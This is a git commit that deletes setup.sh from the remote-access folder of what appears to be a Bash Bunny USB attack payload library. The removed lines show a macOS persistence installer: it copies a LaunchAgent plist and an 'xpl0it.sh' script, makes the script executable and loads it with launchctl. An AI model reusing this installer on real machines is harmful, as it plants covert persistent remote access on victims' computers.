1358ea5924e9a1bea14f8849839e28c5ffe9d940
Matt Barr <30738667+n3urons@users.noreply.github.com>
2018-04-05 00:29:48 -0400

    Delete setup.sh

--- payloads/library/remote_access/setup.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-cp /Volumes/BashBunny/payloads/library/com.xpl0it.plist ~/Library/LaunchAgents
-cp /Volumes/BashBunny/payloads/library/xpl0it.sh /tmp
-chmod a+x /tmp/xpl0it.sh
-launchctl load -w ~/Library/LaunchAgents/com.xpl0it.plist
